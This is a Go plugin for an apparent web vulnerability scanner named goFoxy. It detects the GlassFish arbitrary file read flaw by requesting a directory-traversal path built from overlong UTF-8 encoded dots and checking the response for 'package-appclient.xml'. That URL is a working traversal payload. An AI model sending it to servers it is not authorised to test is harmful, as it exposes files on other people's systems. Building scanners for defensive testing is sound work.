package plugins

import (
	"strconv"
	"net/http"
	"io/ioutil"
	"strings"
	"fmt"
	"goFoxy/manager"
	"goFoxy/common"
)

func init() {
	pl := glassFishFileRead{}
	pl.Name = "glassFishFileRead"
	pl.Author = "dk"
	pl.Default = true
	pl.Help = "GlassFish任意文件读取"
	manager.Regist(pl.Name, pl)
}

type glassFishFileRead struct {
	manager.Plugin
}

func (this glassFishFileRead) GetPluginInfo() map[string]string {
	infoMap := make(map[string]string)
	infoMap["name"] = this.Name
	infoMap["author"] = this.Author
	infoMap["default"] = strconv.FormatBool(this.Default)
	infoMap["flag"] = strconv.FormatBool(this.Flag)
	infoMap["help"] = this.Help
	return infoMap
}

func (this glassFishFileRead) SetPluginFlag(flag bool) bool {
	this.Flag = flag
	return true
}

func (this glassFishFileRead) Toggle() {
	if this.Flag {
		this.Flag = false
	} else {
		this.Flag = true
	}
}

func (this glassFishFileRead) Process(flow common.Flow) {
	newURL := flow.GetSafeBaseURL() + "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
	httpClient := http.Client{}
	resp, err := httpClient.Get(newURL)
	if err != nil {
		return
	}
	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if strings.Contains(string(content), "package-appclient.xml") {
		tmpInfo := common.Vuln{FlowID: flow.ID}
		tmpInfo.Host = flow.Host
		tmpInfo.Title = "GlassFish任意文件读取漏洞"
		tmpInfo.Level = "中危"
		tmpInfo.Content = fmt.Sprintf("%s 存在 GlassFish任意文件读取漏洞", newURL)
		tmpInfo.LogVulnInfo()
	}
}
